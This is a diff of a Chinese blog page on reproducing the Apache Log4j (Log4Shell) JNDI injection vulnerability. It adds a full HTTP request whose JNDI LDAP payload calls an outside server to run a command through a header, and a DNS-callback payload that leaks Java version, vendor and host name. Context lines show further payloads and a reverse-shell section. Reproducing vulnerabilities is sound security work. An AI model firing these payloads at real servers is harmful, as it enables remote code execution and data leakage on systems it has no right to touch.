@@ -21,7 +21,7 @@
     
     
     <meta name="description" content="Apache Log4j任意代码执行漏洞" />
-    <meta name="generator" content="Hugo 0.89.0 with theme pure" />
+    <meta name="generator" content="Hugo 0.91.2 with theme pure" />
     <title>Apache Log4j任意代码执行漏洞 - AD钙奶的博客</title>
     
     
@@ -40,7 +40,7 @@
 <meta itemprop="name" content="Apache Log4j任意代码执行漏洞">
 <meta itemprop="description" content="Apache Log4j任意代码执行漏洞"><meta itemprop="datePublished" content="2021-12-10T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2021-12-13T00:00:00+00:00" />
-<meta itemprop="wordCount" content="433">
+<meta itemprop="wordCount" content="475">
 <meta itemprop="keywords" content="漏洞复现," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Apache Log4j任意代码执行漏洞"/>
 <meta name="twitter:description" content="Apache Log4j任意代码执行漏洞"/>
@@ -494,7 +494,7 @@ function tagCloud(where, min, max) {
     <a class="article-tag-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"> 漏洞复现 </a>
   </span>
 
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 433字</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 475字</span>
 		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 1分 </span>
       </div>
     </div>
@@ -548,6 +548,24 @@ payload=${jndi:ldap://9e735f2d.dns.1433.eu.org/xxxxxx}
 </code></pre>
 <p><img src="images/image-20211210122749895.png" alt="image-20211210122749895"></p>
 <p><img src="images/image-20211210122814540.png" alt="image-20211210122814540"></p>
+<h3 id="执行命令">执行命令</h3>
+<pre><code>POST /hello HTTP/1.1
+Host: 10.108.0.52:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+cmd: pwd
+Content-Length: 68
+
+payload=${jndi:ldap://123.60.xx.xx:1389/TomcatBypass/TomcatEcho}
+</code></pre>
+<p><img src="images/image-20220102200540444.png" alt="image-20220102200540444"></p>
 <h3 id="反弹shell">反弹shell</h3>
 <p>利用工具：https://github.com/welk1n/JNDI-Injection-Exploit</p>
 <p>需要将反弹shell命令使用base64编码</p>
@@ -565,6 +583,7 @@ payload=${jndi:rmi://10.108.0.50:1099/9uf0r6}
 <p><img src="images/image-20211210130807778.png" alt="image-20211210130807778"></p>
 <h3 id="other">Other</h3>
 <pre><code>${jndi:ldap://${sys:java.version}.collaborator.com}
+${jndi:ldap://${sys:java.vendor}.@.${sys:java.version}.@.${hostName}.30ed9b7e.dns.1433.eu.org.}
 </code></pre>
 <p><img src="images/image-20211213115048911.png" alt="image-20211213115048911"></p>
 <h3 id="其他变种paylod记录如下">其他变种Paylod记录如下</h3>
@@ -672,7 +691,7 @@ payload=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
   <div class="copyright">
     &copy;2020  -
-    2021
+    2022
 
     
   </div>
